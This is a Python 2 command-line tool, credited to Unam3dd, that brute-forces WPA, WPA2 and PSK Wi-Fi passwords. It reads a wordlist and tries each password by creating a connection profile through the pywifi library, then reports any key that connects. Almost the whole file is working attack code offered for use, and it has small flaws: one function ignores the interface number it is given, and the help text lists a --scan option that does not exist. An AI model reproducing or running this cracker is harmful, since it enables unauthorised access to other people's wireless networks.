#!/usr/bin/python2
#-*- coding:utf-8 -*-


import os
import platform
import time
import sys
import threading

try:
    from datetime import datetime
except ImportError:
    print("\033[31m[!] Error Datetime Not Found !")

try:
    import pywifi
except ImportError:
    print("\033[31m[!] Error Import PyWifi")

banner = '''
\033[36m
 _  _  _ _____ _______ _____      _______  ______ _______ _______ _     _
 |  |  |   |   |______   |        |       |_____/ |_____| |       |____/ 
 |__|__| __|__ |       __|__      |_____  |    \_ |     | |_____  |    \_

                \033[36m[ Created By Unam3dd ]
                [ Github : Unam3dd   ]
\033[00m
'''

try:
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    results = iface.scan_results()
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    sys.exit("\033[31m[!] Error Pywifi Not Found !")


def python_version():
    if sys.version[0] =="3":
        sys.exit("[*] Python2.7 Required !")


def scan_interface():
    print("\033[32m[\033[34m+\033[32m] Scanning Interfaces....")
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()
    i = 0
    count_iface = len(iface)
    print("\033[32m[\033[34m+\033[32m] Interfaces Found ! : %d" % (count_iface))
    while i<count_iface:
        interface_name = iface[i].name()
        print("\033[32m[\033[34m+\033[32m] [%d] %s" % (i,interface_name))
        i = i+1
    
    print("\n\n")

def wpa_connect(iface_number,ssid,password):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[iface_number]
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        new_profile = iface.add_network_profile(profile)
        time.sleep(0.1)
        iface.connect(new_profile)
        time.sleep(0.35)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            return "\033[32m[\033[34m+\033[32m] Password Found !\n\033[32m[\033[34m+\033[32m] SSID : %s\n\033[32m[\033[34m+\033[32m] Key : %s\n" % (ssid,password)
            sys.exit()
        else:
            return False
    except:
        return False

def wpa2_connect(iface_number,ssid,password):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[iface_number]
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        new_profile = iface.add_network_profile(profile)
        time.sleep(0.1)
        iface.connect(new_profile)
        time.sleep(0.35)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            return "\033[32m[\033[34m+\033[32m] Password Found !\n\033[32m[\033[34m+\033[32m] SSID : %s\n\033[32m[\033[34m+\033[32m] Key : %s\n" % (ssid,password)
            sys.exit()
        else:
            return False
    except:
        return False


def wpa_psk_connect(iface_number,ssid,password):
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[iface_number]
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPAPSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        new_profile = iface.add_network_profile(profile)
        time.sleep(0.1)
        iface.connect(new_profile)
        time.sleep(0.35)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            return "\033[32m[\033[34m+\033[32m] Password Found !\n\033[32m[\033[34m+\033[32m] SSID : %s\n\033[32m[\033[34m+\033[32m] Key : %s\n" % (ssid,password)
            sys.exit()
        else:
            return False
    except:
        return False

def wpa2_psk_connect(iface_number,ssid,password):
    try:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = pywifi.const.AUTH_ALG_OPEN
        profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
        profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
        profile.key = password
        iface.remove_all_network_profiles()
        new_profile = iface.add_network_profile(profile)
        time.sleep(0.1)
        iface.connect(new_profile)
        time.sleep(0.35)
        if iface.status() == pywifi.const.IFACE_CONNECTED:
            return "\033[32m[\033[34m+\033[32m] Password Found !\n\033[32m[\033[34m+\033[32m] SSID : %s\n\033[32m[\033[34m+\033[32m] Key : %s\n" % (ssid,password)
        else:
            return False
    except:
        return False


def pwn_wpa2_psk(iface,ssid,password):
    try_connect = wpa2_psk_connect(iface,ssid,password)
    if try_connect ==False:
        print("\033[32m[\033[31m-\033[32m] Password Failed => \033[31m%s\033[00m for \033[33m%s\033[00m" % (password,ssid))
    else:
        print(try_connect)
        sys.exit(0)

def start_crack(interface_number,ssid,akm,wordlist):
    
    if akm =="wpa":
        check_wordlist = os.path.exists(wordlist)
        if check_wordlist ==True:
            with open(wordlist,'r') as f:
                content = f.readlines()
                for passwd in content:
                    passwd = passwd.rstrip()
                    try_connect = wpa_connect(interface_number,ssid,passwd)
                    if try_connect ==False:
                        print("\033[32m[\033[31m-\033[32m] Password Failed => \033[31m%s\033[00m for \033[33m%s\033[00m" % (passwd,ssid))
                    else:
                        print(try_connect)
                        sys.exit(0)
        else:
            print("\033[31m[!] Error Wordlist !")
            return False
        

    elif akm =="wpa2":
        check_wordlist = os.path.exists(wordlist)
        if check_wordlist ==True:
            with open(wordlist,'r') as f:
                content = f.readlines()
                for passwd in content:
                    passwd = passwd.rstrip()
                    try_connect = wpa2_connect(interface_number,ssid,passwd)
                    if try_connect ==False:
                        print("\033[32m[\033[31m-\033[32m] Password Failed => \033[31m%s\033[00m for \033[33m%s\033[00m" % (passwd,ssid))
                    else:
                        print(try_connect)
                        sys.exit(0)
        else:
            print("\033[31m[!] Error Wordlist !")
            return False
        


    elif akm =="wpapsk":
        check_wordlist = os.path.exists(wordlist)
        if check_wordlist ==True:
            with open(wordlist,'r') as f:
                content = f.readlines()
                for passwd in content:
                    passwd = passwd.rstrip()
                    try_connect = wpa_psk_connect(interface_number,ssid,passwd)
                    if try_connect ==False:
                        print("\033[32m[\033[31m-\033[32m] Password Failed => \033[31m%s\033[00m for \033[33m%s\033[00m" % (passwd,ssid))
                    else:
                        print(try_connect)
                        sys.exit(0)
        else:
            print("\033[31m[!] Error Wordlist !")
            return False

    elif akm =="wpa2psk":
        check_wordlist = os.path.exists(wordlist)
        if check_wordlist ==True:
            with open(wordlist,'r') as f:
                content = f.readlines()
                for passwd in content:
                    passwd = passwd.rstrip()
                    try_connect = wpa2_psk_connect(interface_number,ssid,passwd)
                    if try_connect ==False:
                        print("\033[32m[\033[31m-\033[32m] Password Failed => \033[31m%s\033[00m for \033[33m%s\033[00m" % (passwd,ssid))
                    else:
                        print(try_connect)
                        sys.exit(0)
        else:
            print("\033[31m[!] Error Wordlist !")
            return False
        
    else:
        print("\033[32m[\033[34m+\033[32m] Security Protocol (AKM) Unknown")

if __name__ == '__main__':
    python_version()
    print(banner)
    if len(sys.argv) < 2:
        print("\033[36musage : %s -h" % (sys.argv[0]))
        print("        %s --show-interface" % (sys.argv[0]))
        print("        %s --crack <interface_number> <ssid> <wordlist> <wpa/wpa2/wpapsk/wpa2psk>" % (sys.argv[0]))
        print("\033[00m\n\n")
    else:
        if sys.argv[1] =="--show-interface":
            scan_interface()
        
        elif sys.argv[1] =="-h":
            print("\033[36musage : %s -h" % (sys.argv[0]))
            print("        %s --show-interface" % (sys.argv[0]))
            print("        %s --scan <interface>" % (sys.argv[0]))
            print("        %s --crack <interface_number> <ssid> <wordlist> <wpa/wpa2/wpapsk/wpa2psk>" % (sys.argv[0]))
            print("\033[00m\n\n")
        
        elif sys.argv[1] =="--crack":
            try:
                interface = sys.argv[2]
                ssid = sys.argv[3]
                wordlist = sys.argv[4]
                method = sys.argv[5]
                start_crack(interface,ssid,method,wordlist)
            except IndexError:
                print("\033[31m[!] Error Please Enter Options !")
        else:
            print("\033[36musage : %s -h" % (sys.argv[0]))
            print("        %s --show-interface" % (sys.argv[0]))
            print("        %s --crack <interface_number> <ssid> <wordlist> <wpa/wpa2/wpapsk/wpa2psk>" % (sys.argv[0]))
            print("\033[00m\n\n")

